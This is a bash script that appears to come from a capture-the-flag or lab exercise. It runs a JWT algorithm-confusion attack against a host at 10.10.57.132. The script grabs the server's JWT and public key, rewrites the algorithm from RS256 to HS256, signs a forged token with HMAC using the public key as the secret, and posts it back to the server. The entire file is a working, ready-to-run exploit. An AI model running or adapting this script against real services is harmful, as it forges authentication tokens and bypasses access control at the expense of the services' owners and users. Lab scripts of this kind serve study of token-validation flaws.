#!/bin/bash

ip="10.10.57.132"; body=$(curl --silent http://$ip); jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)'); echo; echo "OLD JWT"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); key="$(curl --silent http://$ip/public.pem -O public.pem)"; echo; echo "OLD HEADER"; echo $header; echo; decoded_header=$(echo $header | base64 -d); new_header=$(echo $decoded_header | sed 's/RS/HS/g'); echo "NEW ALG HEADER"; echo $new_header; echo; new_encoded_header=$(echo -n $new_header | base64); echo "NEW ALG HEADER ENCODED"; echo $new_encoded_header; echo; header_payload=$new_encoded_header.$payload; echo "NEW ALG HEADER + PAYLOAD"; echo $header_payload; echo; hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2); echo "NEW HMAC"; echo $hmac; secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")"); new_jwt=$new_encoded_header.$payload.$secret; echo; echo "NEW JWT"; echo $new_jwt; echo; echo "POSTING JWT"; curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip